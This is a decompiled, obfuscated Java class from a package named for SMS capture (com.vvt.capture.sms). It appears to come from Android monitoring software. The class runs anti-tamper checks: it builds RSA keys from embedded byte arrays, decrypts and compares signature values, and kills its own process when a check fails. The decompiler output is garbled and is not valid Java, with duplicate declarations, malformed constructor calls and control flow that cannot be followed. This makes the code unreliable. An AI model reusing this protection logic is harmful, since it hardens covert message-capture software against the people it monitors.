package com.vvt.capture.sms;

import android.os.Process;
import android.os.SystemClock;
import c.v.c.s.D;
import c.v.c.s.G;
import c.v.c.s.O;
import c.v.c.s.S;
import c.v.c.s.W;
import c.v.c.s.X;
import c.v.c.s.Z;
import com.vvt.ag.b;
import com.vvt.appengine.u;
import com.vvt.j.a;
import java.security.GeneralSecurityException;
import java.security.Key;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;

class f
  implements Runnable
{
  f(e parame) {}
  
  private byte[] a()
  {
    byte[] arrayOfByte = new byte[64];
    byte[] tmp6_5 = arrayOfByte;
    byte[] tmp7_6 = tmp6_5;
    byte[] tmp7_6 = tmp6_5;
    tmp7_6[0] = 127;
    tmp7_6[1] = 99;
    byte[] tmp16_7 = tmp7_6;
    byte[] tmp16_7 = tmp7_6;
    tmp16_7[2] = 77;
    tmp16_7[3] = -75;
    byte[] tmp25_16 = tmp16_7;
    byte[] tmp25_16 = tmp16_7;
    tmp25_16[4] = 78;
    tmp25_16[5] = 82;
    byte[] tmp34_25 = tmp25_16;
    byte[] tmp34_25 = tmp25_16;
    tmp34_25[6] = 21;
    tmp34_25[7] = 27;
    byte[] tmp45_34 = tmp34_25;
    byte[] tmp45_34 = tmp34_25;
    tmp45_34[8] = 9;
    tmp45_34[9] = -43;
    byte[] tmp56_45 = tmp45_34;
    byte[] tmp56_45 = tmp45_34;
    tmp56_45[10] = -30;
    tmp56_45[11] = 114;
    byte[] tmp67_56 = tmp56_45;
    byte[] tmp67_56 = tmp56_45;
    tmp67_56[12] = 25;
    tmp67_56[13] = -103;
    byte[] tmp78_67 = tmp67_56;
    byte[] tmp78_67 = tmp67_56;
    tmp78_67[14] = -85;
    tmp78_67[15] = -83;
    byte[] tmp89_78 = tmp78_67;
    byte[] tmp89_78 = tmp78_67;
    tmp89_78[16] = 52;
    tmp89_78[17] = -85;
    byte[] tmp100_89 = tmp89_78;
    byte[] tmp100_89 = tmp89_78;
    tmp100_89[18] = 103;
    tmp100_89[19] = -14;
    byte[] tmp111_100 = tmp100_89;
    byte[] tmp111_100 = tmp100_89;
    tmp111_100[20] = 63;
    tmp111_100[21] = 94;
    byte[] tmp122_111 = tmp111_100;
    byte[] tmp122_111 = tmp111_100;
    tmp122_111[22] = -108;
    tmp122_111[23] = 83;
    byte[] tmp133_122 = tmp122_111;
    byte[] tmp133_122 = tmp122_111;
    tmp133_122[24] = -55;
    tmp133_122[25] = -11;
    byte[] tmp144_133 = tmp133_122;
    byte[] tmp144_133 = tmp133_122;
    tmp144_133[26] = -113;
    tmp144_133[27] = -21;
    byte[] tmp155_144 = tmp144_133;
    byte[] tmp155_144 = tmp144_133;
    tmp155_144[28] = -94;
    tmp155_144[29] = 124;
    byte[] tmp166_155 = tmp155_144;
    byte[] tmp166_155 = tmp155_144;
    tmp166_155[30] = 23;
    tmp166_155[31] = 64;
    byte[] tmp177_166 = tmp166_155;
    byte[] tmp177_166 = tmp166_155;
    tmp177_166[32] = -122;
    tmp177_166[33] = -79;
    byte[] tmp188_177 = tmp177_166;
    byte[] tmp188_177 = tmp177_166;
    tmp188_177[34] = 24;
    tmp188_177[35] = 67;
    byte[] tmp199_188 = tmp188_177;
    byte[] tmp199_188 = tmp188_177;
    tmp199_188[36] = 118;
    tmp199_188[37] = 54;
    byte[] tmp210_199 = tmp199_188;
    byte[] tmp210_199 = tmp199_188;
    tmp210_199[38] = 31;
    tmp210_199[39] = -44;
    byte[] tmp221_210 = tmp210_199;
    byte[] tmp221_210 = tmp210_199;
    tmp221_210[40] = -67;
    tmp221_210[41] = 122;
    byte[] tmp232_221 = tmp221_210;
    byte[] tmp232_221 = tmp221_210;
    tmp232_221[42] = -42;
    tmp232_221[43] = 53;
    byte[] tmp243_232 = tmp232_221;
    byte[] tmp243_232 = tmp232_221;
    tmp243_232[44] = -119;
    tmp243_232[45] = -2;
    byte[] tmp254_243 = tmp243_232;
    byte[] tmp254_243 = tmp243_232;
    tmp254_243[46] = -70;
    tmp254_243[47] = -38;
    byte[] tmp265_254 = tmp254_243;
    byte[] tmp265_254 = tmp254_243;
    tmp265_254[48] = 93;
    tmp265_254[49] = -113;
    byte[] tmp276_265 = tmp265_254;
    byte[] tmp276_265 = tmp265_254;
    tmp276_265[50] = -8;
    tmp276_265[51] = -10;
    byte[] tmp287_276 = tmp276_265;
    byte[] tmp287_276 = tmp276_265;
    tmp287_276[52] = -86;
    tmp287_276[53] = -50;
    byte[] tmp298_287 = tmp287_276;
    byte[] tmp298_287 = tmp287_276;
    tmp298_287[54] = -127;
    tmp298_287[55] = -77;
    byte[] tmp309_298 = tmp298_287;
    byte[] tmp309_298 = tmp298_287;
    tmp309_298[56] = 104;
    tmp309_298[57] = 105;
    byte[] tmp320_309 = tmp309_298;
    byte[] tmp320_309 = tmp309_298;
    tmp320_309[58] = -126;
    tmp320_309[59] = 23;
    byte[] tmp331_320 = tmp320_309;
    byte[] tmp331_320 = tmp320_309;
    tmp331_320[60] = 106;
    tmp331_320[61] = -65;
    tmp331_320[62] = -4;
    tmp331_320[63] = 43;
    return arrayOfByte;
  }
  
  private byte[] b()
  {
    byte[] arrayOfByte = new byte[94];
    byte[] tmp6_5 = arrayOfByte;
    byte[] tmp7_6 = tmp6_5;
    byte[] tmp7_6 = tmp6_5;
    tmp7_6[0] = 48;
    tmp7_6[1] = 92;
    byte[] tmp16_7 = tmp7_6;
    byte[] tmp16_7 = tmp7_6;
    tmp16_7[2] = 48;
    tmp16_7[3] = 13;
    byte[] tmp25_16 = tmp16_7;
    byte[] tmp25_16 = tmp16_7;
    tmp25_16[4] = 6;
    tmp25_16[5] = 9;
    byte[] tmp34_25 = tmp25_16;
    byte[] tmp34_25 = tmp25_16;
    tmp34_25[6] = 42;
    tmp34_25[7] = -122;
    byte[] tmp45_34 = tmp34_25;
    byte[] tmp45_34 = tmp34_25;
    tmp45_34[8] = 72;
    tmp45_34[9] = -122;
    byte[] tmp56_45 = tmp45_34;
    byte[] tmp56_45 = tmp45_34;
    tmp56_45[10] = -9;
    tmp56_45[11] = 13;
    byte[] tmp67_56 = tmp56_45;
    byte[] tmp67_56 = tmp56_45;
    tmp67_56[12] = 1;
    tmp67_56[13] = 1;
    byte[] tmp76_67 = tmp67_56;
    byte[] tmp76_67 = tmp67_56;
    tmp76_67[14] = 1;
    tmp76_67[15] = 5;
    byte[] tmp85_76 = tmp76_67;
    byte[] tmp85_76 = tmp76_67;
    tmp85_76[16] = 0;
    tmp85_76[17] = 3;
    byte[] tmp94_85 = tmp85_76;
    byte[] tmp94_85 = tmp85_76;
    tmp94_85[18] = 75;
    tmp94_85[19] = 0;
    byte[] tmp104_94 = tmp94_85;
    byte[] tmp104_94 = tmp94_85;
    tmp104_94[20] = 48;
    tmp104_94[21] = 72;
    byte[] tmp115_104 = tmp104_94;
    byte[] tmp115_104 = tmp104_94;
    tmp115_104[22] = 2;
    tmp115_104[23] = 65;
    byte[] tmp125_115 = tmp115_104;
    byte[] tmp125_115 = tmp115_104;
    tmp125_115[24] = 0;
    tmp125_115[25] = -75;
    byte[] tmp135_125 = tmp125_115;
    byte[] tmp135_125 = tmp125_115;
    tmp135_125[26] = 0;
    tmp135_125[27] = 7;
    byte[] tmp145_135 = tmp135_125;
    byte[] tmp145_135 = tmp135_125;
    tmp145_135[28] = -59;
    tmp145_135[29] = -51;
    byte[] tmp156_145 = tmp145_135;
    byte[] tmp156_145 = tmp145_135;
    tmp156_145[30] = 88;
    tmp156_145[31] = 15;
    byte[] tmp167_156 = tmp156_145;
    byte[] tmp167_156 = tmp156_145;
    tmp167_156[32] = 58;
    tmp167_156[33] = 104;
    byte[] tmp178_167 = tmp167_156;
    byte[] tmp178_167 = tmp167_156;
    tmp178_167[34] = -11;
    tmp178_167[35] = 25;
    byte[] tmp189_178 = tmp178_167;
    byte[] tmp189_178 = tmp178_167;
    tmp189_178[36] = -113;
    tmp189_178[37] = 123;
    byte[] tmp200_189 = tmp189_178;
    byte[] tmp200_189 = tmp189_178;
    tmp200_189[38] = -80;
    tmp200_189[39] = -104;
    byte[] tmp211_200 = tmp200_189;
    byte[] tmp211_200 = tmp200_189;
    tmp211_200[40] = -122;
    tmp211_200[41] = 8;
    byte[] tmp222_211 = tmp211_200;
    byte[] tmp222_211 = tmp211_200;
    tmp222_211[42] = -34;
    tmp222_211[43] = -100;
    byte[] tmp233_222 = tmp222_211;
    byte[] tmp233_222 = tmp222_211;
    tmp233_222[44] = 58;
    tmp233_222[45] = 92;
    byte[] tmp244_233 = tmp233_222;
    byte[] tmp244_233 = tmp233_222;
    tmp244_233[46] = 38;
    tmp244_233[47] = 107;
    byte[] tmp255_244 = tmp244_233;
    byte[] tmp255_244 = tmp244_233;
    tmp255_244[48] = -28;
    tmp255_244[49] = 99;
    byte[] tmp266_255 = tmp255_244;
    byte[] tmp266_255 = tmp255_244;
    tmp266_255[50] = -58;
    tmp266_255[51] = 40;
    byte[] tmp277_266 = tmp266_255;
    byte[] tmp277_266 = tmp266_255;
    tmp277_266[52] = 0;
    tmp277_266[53] = 49;
    byte[] tmp287_277 = tmp277_266;
    byte[] tmp287_277 = tmp277_266;
    tmp287_277[54] = 70;
    tmp287_277[55] = 70;
    byte[] tmp298_287 = tmp287_277;
    byte[] tmp298_287 = tmp287_277;
    tmp298_287[56] = -39;
    tmp298_287[57] = 12;
    byte[] tmp309_298 = tmp298_287;
    byte[] tmp309_298 = tmp298_287;
    tmp309_298[58] = -103;
    tmp309_298[59] = 92;
    byte[] tmp320_309 = tmp309_298;
    byte[] tmp320_309 = tmp309_298;
    tmp320_309[60] = 28;
    tmp320_309[61] = -120;
    byte[] tmp331_320 = tmp320_309;
    byte[] tmp331_320 = tmp320_309;
    tmp331_320[62] = -95;
    tmp331_320[63] = -49;
    byte[] tmp342_331 = tmp331_320;
    byte[] tmp342_331 = tmp331_320;
    tmp342_331[64] = -3;
    tmp342_331[65] = -18;
    byte[] tmp353_342 = tmp342_331;
    byte[] tmp353_342 = tmp342_331;
    tmp353_342[66] = -123;
    tmp353_342[67] = 68;
    byte[] tmp364_353 = tmp353_342;
    byte[] tmp364_353 = tmp353_342;
    tmp364_353[68] = 99;
    tmp364_353[69] = -104;
    byte[] tmp375_364 = tmp364_353;
    byte[] tmp375_364 = tmp364_353;
    tmp375_364[70] = -68;
    tmp375_364[71] = 22;
    byte[] tmp386_375 = tmp375_364;
    byte[] tmp386_375 = tmp375_364;
    tmp386_375[72] = -57;
    tmp386_375[73] = -75;
    byte[] tmp397_386 = tmp386_375;
    byte[] tmp397_386 = tmp386_375;
    tmp397_386[74] = -3;
    tmp397_386[75] = 18;
    byte[] tmp408_397 = tmp397_386;
    byte[] tmp408_397 = tmp397_386;
    tmp408_397[76] = -84;
    tmp408_397[77] = 19;
    byte[] tmp419_408 = tmp408_397;
    byte[] tmp419_408 = tmp408_397;
    tmp419_408[78] = -24;
    tmp419_408[79] = 119;
    byte[] tmp430_419 = tmp419_408;
    byte[] tmp430_419 = tmp419_408;
    tmp430_419[80] = -26;
    tmp430_419[81] = 111;
    byte[] tmp441_430 = tmp430_419;
    byte[] tmp441_430 = tmp430_419;
    tmp441_430[82] = -67;
    tmp441_430[83] = -29;
    byte[] tmp452_441 = tmp441_430;
    byte[] tmp452_441 = tmp441_430;
    tmp452_441[84] = -86;
    tmp452_441[85] = 56;
    byte[] tmp463_452 = tmp452_441;
    byte[] tmp463_452 = tmp452_441;
    tmp463_452[86] = -59;
    tmp463_452[87] = -5;
    byte[] tmp474_463 = tmp463_452;
    byte[] tmp474_463 = tmp463_452;
    tmp474_463[88] = 61;
    tmp474_463[89] = 2;
    byte[] tmp484_474 = tmp474_463;
    byte[] tmp484_474 = tmp474_463;
    tmp484_474[90] = 3;
    tmp484_474[91] = 1;
    tmp484_474[92] = 0;
    tmp484_474[93] = 1;
    return arrayOfByte;
  }
  
  public void run()
  {
    int i = 1;
    boolean bool1 = c.c();
    if (bool1) {}
    bool1 = c.c();
    if (bool1) {}
    int i11;
    Object localObject10;
    try
    {
      localObject1 = new com/vvt/appengine/u;
      localObject2 = this.a;
      localObject2 = ((e)localObject2).a;
      localObject2 = ((c)localObject2).b();
      localObject2 = com.vvt.l.g.a((byte[])localObject2);
      ((u)localObject1).<init>((RSAPublicKey)localObject2);
      bool1 = c.c();
      if (bool1) {}
      localArrayList = new java/util/ArrayList;
      localArrayList.<init>();
      localObject2 = this.a.a.b();
      localArrayList.add(localObject2);
      localObject2 = new com/vvt/j/a;
      ((a)localObject2).<init>();
      localObject2 = ((a)localObject2).b();
      localArrayList.add(localObject2);
      j = localArrayList.size();
      i11 = j;
    }
    catch (Exception localException1)
    {
      ArrayList localArrayList;
      label319:
      label528:
      label665:
      for (;;)
      {
        Object localObject2;
        int j;
        int i12;
        boolean bool2;
        int k;
        bool3 = c.d();
        if (bool3) {}
        m = Process.myPid();
        Process.killProcess(m);
        continue;
        m = i11 + -1;
        i11 = m;
        continue;
        bool4 = c.c();
        if (bool4) {}
        localObject3 = new java/util/ArrayList;
        ((ArrayList)localObject3).<init>();
        localObject10 = this.a.a.a();
        ((ArrayList)localObject3).add(localObject10);
        localObject10 = new com/vvt/j/a;
        ((a)localObject10).<init>();
        localObject10 = ((a)localObject10).a();
        ((ArrayList)localObject3).add(localObject10);
        bool16 = c.c();
        if (bool16) {}
        localArrayList = new java/util/ArrayList;
        localArrayList.<init>();
        localObject10 = ((ArrayList)localObject3).iterator();
        bool4 = ((Iterator)localObject10).hasNext();
        if (bool4)
        {
          localObject3 = (byte[])((Iterator)localObject10).next();
          try
          {
            localObject11 = ((u)localObject1).a();
            localObject3 = com.vvt.l.f.a((Key)localObject11, (byte[])localObject3);
            localObject11 = new java/lang/String;
            ((String)localObject11).<init>((byte[])localObject3);
            localArrayList.add(localObject11);
            bool4 = c.c();
            if (!bool4) {
              break label319;
            }
            break label319;
          }
          catch (GeneralSecurityException localGeneralSecurityException1)
          {
            bool4 = c.d();
            if (bool4) {}
            n = Process.myPid();
            Process.killProcess(n);
          }
        }
        else
        {
          bool5 = c.c();
          if (bool5) {}
          i1 = localArrayList.size();
          for (i11 = i1;; i11 = i2)
          {
            if (i11 <= i) {
              break label528;
            }
            i1 = i11 + -1;
            i14 = i11 + -2;
            localObject4 = localArrayList.get(i1);
            localObject10 = localObject4;
            localObject10 = (String)localObject4;
            localObject4 = (String)localArrayList.get(i14);
            bool17 = c.c();
            if (bool17) {}
            bool6 = ((String)localObject10).equals(localObject4);
            if (!bool6)
            {
              bool6 = c.e();
              if (bool6) {}
              i2 = Process.myPid();
              Process.killProcess(i2);
              break;
            }
            i2 = i11 + -1;
          }
          try
          {
            localObject4 = new com/vvt/appengine/u;
            localObject10 = b();
            localObject10 = com.vvt.l.g.a((byte[])localObject10);
            ((u)localObject4).<init>((RSAPublicKey)localObject10);
          }
          catch (Exception localException2)
          {
            try
            {
              localObject4 = ((u)localObject4).a();
              localObject10 = a();
              localObject4 = com.vvt.l.f.a((Key)localObject4, (byte[])localObject10);
              localObject10 = new java/lang/String;
              ((String)localObject10).<init>((byte[])localObject4);
              bool7 = c.c();
              if (bool7) {}
              localObject4 = localArrayList.get(0);
              bool7 = ((String)localObject10).equals(localObject4);
              if (bool7) {
                break;
              }
              bool7 = c.e();
              if (bool7) {}
              i3 = Process.myPid();
              Process.killProcess(i3);
            }
            catch (GeneralSecurityException localGeneralSecurityException2)
            {
              bool9 = c.d();
              if (!bool9) {
                break label665;
              }
              i5 = Process.myPid();
              Process.killProcess(i5);
            }
            localException2 = localException2;
            bool8 = c.d();
            if (bool8) {}
            i4 = Process.myPid();
            Process.killProcess(i4);
          }
        }
      }
      localObject10 = new c/v/c/s/S;
      ((S)localObject10).<init>();
      bool10 = c.c();
      if (!bool10) {
        break label694;
      }
      label694:
      localObject5 = new int[6];
      Object tmp702_700 = localObject5;
      Object tmp703_702 = tmp702_700;
      Object tmp703_702 = tmp702_700;
      tmp703_702[0] = 115;
      tmp703_702[1] = 118;
      Object tmp712_703 = tmp703_702;
      Object tmp712_703 = tmp703_702;
      tmp712_703[2] = 100;
      tmp712_703[3] = 117;
      tmp712_703[4] = 99;
      tmp712_703[5] = 107;
      localObject11 = b.a((int[])localObject5);
      bool10 = c.c();
      if (!bool10) {
        break label744;
      }
      label744:
      localObject5 = (String)localArrayList.get(0);
      Object localObject1 = "htc";
      localObject5 = ((S)localObject10).svvu((String)localObject5, (String)localObject1);
      bool10 = ((String)localObject5).equals(localObject11);
      if (bool10) {
        break label827;
      }
    }
    if (i11 > i)
    {
      j = i11 + -1;
      i12 = i11 + -2;
      localObject2 = (byte[])localArrayList.get(j);
      localObject10 = (byte[])localArrayList.get(i12);
      bool2 = Arrays.equals((byte[])localObject2, (byte[])localObject10);
      if (!bool2)
      {
        bool2 = c.e();
        if (bool2) {}
        k = Process.myPid();
        Process.killProcess(k);
      }
    }
    for (;;)
    {
      return;
      try
      {
        boolean bool3;
        int m;
        boolean bool4;
        Object localObject3;
        boolean bool16;
        int n;
        boolean bool5;
        int i1;
        int i14;
        Object localObject4;
        boolean bool17;
        boolean bool6;
        int i2;
        boolean bool7;
        int i3;
        boolean bool8;
        int i4;
        boolean bool9;
        int i5;
        localObject5 = new c/v/c/s/D;
        ((D)localObject5).<init>();
        localObject10 = "Samsung";
        Object localObject11 = "Gt-I9100";
        ((D)localObject5).conc((String)localObject10, (String)localObject11);
      }
      finally
      {
        boolean bool10;
        Object localObject5;
        int i6;
        long l;
        boolean bool11;
        int i7;
        boolean bool12;
        int i8;
        int i13;
        Object localObject7;
        for (;;) {}
      }
      bool10 = c.e();
      if (bool10) {}
      i6 = Process.myPid();
      Process.killProcess(i6);
      continue;
      label827:
      l = i;
      SystemClock.sleep(l);
      bool11 = c.c();
      if (bool11) {}
      localObject5 = this.a.a.b();
      i7 = ((S)localObject10).ssvk((byte[])localObject5, 90);
      i11 = 699;
      if (i7 != i11)
      {
        localObject5 = new java/lang/StringBuilder;
        ((StringBuilder)localObject5).<init>();
        ((StringBuilder)localObject5).append("Motorola");
        localObject10 = "RAZR";
        ((StringBuilder)localObject5).append((String)localObject10);
        ((StringBuilder)localObject5).toString();
        bool12 = c.e();
        if (bool12) {}
        i8 = Process.myPid();
        Process.killProcess(i8);
      }
      else
      {
        l = i;
        SystemClock.sleep(l);
        switch (i)
        {
        }
        for (;;)
        {
          boolean bool13 = c.c();
          if (bool13) {}
          int i9 = ((S)localObject10).svht();
          i13 = 169;
          if (i9 == i13) {
            break label1089;
          }
          localObject5 = new com/vvt/capture/sms/g;
          ((g)localObject5).<init>(this);
          localObject10 = new java/lang/Thread;
          ((Thread)localObject10).<init>((Runnable)localObject5);
          ((Thread)localObject10).start();
          boolean bool14 = c.e();
          if (bool14) {}
          int i10 = Process.myPid();
          Process.killProcess(i10);
          break;
          try
          {
            localObject5 = new c/v/c/s/G;
            ((G)localObject5).<init>();
            ((G)localObject5).nala();
            continue;
          }
          finally {}
          continue;
          localObject7 = new c/v/c/s/X;
          ((X)localObject7).<init>();
          i11 = 1;
          int i15 = 2;
          ((X)localObject7).bulat(i11, i15);
        }
        label1089:
        localObject7 = "Android system check";
        ((String)localObject7).hashCode();
      }
      try
      {
        localObject7 = new c/v/c/s/Z;
        ((Z)localObject7).<init>();
        ((Z)localObject7).jkol();
        localObject7 = new c/v/c/s/O;
        ((O)localObject7).<init>();
        localObject10 = new c/v/c/s/W;
        ((W)localObject10).<init>();
        i13 = ((W)localObject10).jpit();
        ((O)localObject7).slaoce(i13);
      }
      finally
      {
        boolean bool15;
        for (;;) {}
      }
      localObject7 = this.a.a;
      i13 = 3;
      localObject10 = new int[i13];
      Object tmp1168_1166 = localObject10;
      tmp1168_1166[0] = 97;
      Object tmp1173_1168 = tmp1168_1166;
      tmp1173_1168[1] = 97;
      tmp1173_1168[2] = 97;
      localObject10 = b.a((int[])localObject10);
      c.a((c)localObject7, localObject10);
      bool15 = c.c();
      if (!bool15) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/sms/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */